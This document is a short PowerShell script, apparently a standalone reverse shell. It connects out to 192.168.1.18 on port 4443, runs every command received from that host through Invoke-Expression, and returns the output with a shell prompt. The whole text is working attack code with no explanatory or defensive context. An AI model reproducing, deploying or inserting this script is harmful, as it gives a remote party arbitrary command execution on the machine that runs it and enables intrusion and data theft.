$c=New-Object Net.Sockets.TCPClient('192.168.1.18',4443)
$s=$c.GetStream()
[byte[]]$b=0..65535|%{0}
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
    $d=([Text.Encoding]::ASCII).GetString($b,0,$i)
    $r=iex $d 2>&1 | Out-String
    $r2=$r+'PS '+(pwd).Path+'> '
    $s.Write(([Text.Encoding]::ASCII).GetBytes($r2),0,$r2.Length)
    $s.Flush()
}
$c.Close()
